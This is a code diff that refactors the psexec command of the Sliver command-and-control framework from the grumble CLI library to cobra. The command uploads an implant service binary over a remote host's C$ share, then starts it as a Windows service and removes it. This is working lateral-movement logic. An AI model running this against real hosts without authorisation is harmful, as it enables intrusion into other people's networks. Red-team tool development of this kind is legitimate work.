@@ -27,36 +27,36 @@ import (
 
 	insecureRand "math/rand"
 
+	"github.com/spf13/cobra"
+
 	"github.com/bishopfox/sliver/client/command/generate"
 	"github.com/bishopfox/sliver/client/command/settings"
 	"github.com/bishopfox/sliver/client/console"
 	"github.com/bishopfox/sliver/protobuf/clientpb"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
-	"github.com/bishopfox/sliver/server/codenames"
 	"github.com/bishopfox/sliver/util/encoders"
-	"github.com/desertbit/grumble"
 )
 
 // PsExecCmd - psexec command implementation.
-func PsExecCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
+func PsExecCmd(cmd *cobra.Command, con *console.SliverConsoleClient, args []string) {
 	session := con.ActiveTarget.GetSessionInteractive()
 	if session == nil {
 		return
 	}
 
-	hostname := ctx.Args.String("hostname")
+	hostname := args[0]
 	if hostname == "" {
 		con.PrintErrorf("You need to provide a target host, see `help psexec` for examples")
 		return
 	}
 	var serviceBinary []byte
-	profile := ctx.Flags.String("profile")
-	serviceName := ctx.Flags.String("service-name")
-	serviceDesc := ctx.Flags.String("service-description")
-	binPath := ctx.Flags.String("binpath")
-	customExe := ctx.Flags.String("custom-exe")
-	uploadPath := fmt.Sprintf(`\\%s\%s`, hostname, strings.ReplaceAll(strings.ToLower(ctx.Flags.String("binpath")), "c:", "C$"))
+	profile, _ := cmd.Flags().GetString("profile")
+	serviceName, _ := cmd.Flags().GetString("service-name")
+	serviceDesc, _ := cmd.Flags().GetString("service-description")
+	binPath, _ := cmd.Flags().GetString("binpath")
+	customExe, _ := cmd.Flags().GetString("custom-exe")
+	uploadPath := fmt.Sprintf(`\\%s\%s`, hostname, strings.ReplaceAll(strings.ToLower(binPath), "c:", "C$"))
 
 	if serviceName == "Sliver" || serviceDesc == "Sliver implant" {
 		con.PrintWarnf("You're going to deploy the following service:\n- Name: %s\n- Description: %s\n", serviceName, serviceDesc)
@@ -105,7 +105,7 @@ func PsExecCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
 
 	filename := randomFileName()
 	filePath := fmt.Sprintf("%s\\%s.exe", uploadPath, filename)
-	uploadGzip := new(encoders.Gzip).Encode(serviceBinary)
+	uploadGzip, _ := new(encoders.Gzip).Encode(serviceBinary)
 	// upload to remote target
 	uploadCtrl := make(chan bool)
 	con.SpinUntil("Uploading service binary ...", uploadCtrl)
@@ -113,7 +113,7 @@ func PsExecCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
 		Encoder: "gzip",
 		Data:    uploadGzip,
 		Path:    filePath,
-		Request: con.ActiveTarget.Request(ctx),
+		Request: con.ActiveTarget.Request(cmd),
 	})
 	uploadCtrl <- true
 	<-uploadCtrl
@@ -136,7 +136,7 @@ func PsExecCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
 	start, err := con.Rpc.StartService(context.Background(), &sliverpb.StartServiceReq{
 		BinPath:            binaryPath,
 		Hostname:           hostname,
-		Request:            con.ActiveTarget.Request(ctx),
+		Request:            con.ActiveTarget.Request(cmd),
 		ServiceDescription: serviceDesc,
 		ServiceName:        serviceName,
 		Arguments:          "",
@@ -159,7 +159,7 @@ func PsExecCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
 			Hostname:    hostname,
 			ServiceName: serviceName,
 		},
-		Request: con.ActiveTarget.Request(ctx),
+		Request: con.ActiveTarget.Request(cmd),
 	})
 	removeChan <- true
 	<-removeChan
@@ -174,8 +174,17 @@ func PsExecCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
 	con.PrintInfof("Successfully removed service %s on %s\n", serviceName, hostname)
 }
 
+func randomString() string {
+	alphanumeric := "abcdefghijklmnopqrstuvwxyz0123456789"
+	str := ""
+	for index := 0; index < insecureRand.Intn(8)+1; index++ {
+		str += string(alphanumeric[insecureRand.Intn(len(alphanumeric))])
+	}
+	return str
+}
+
 func randomFileName() string {
-	noun, _ := codenames.RandomNoun()
+	noun := randomString()
 	noun = strings.ToLower(noun)
 	switch insecureRand.Intn(3) {
 	case 0:
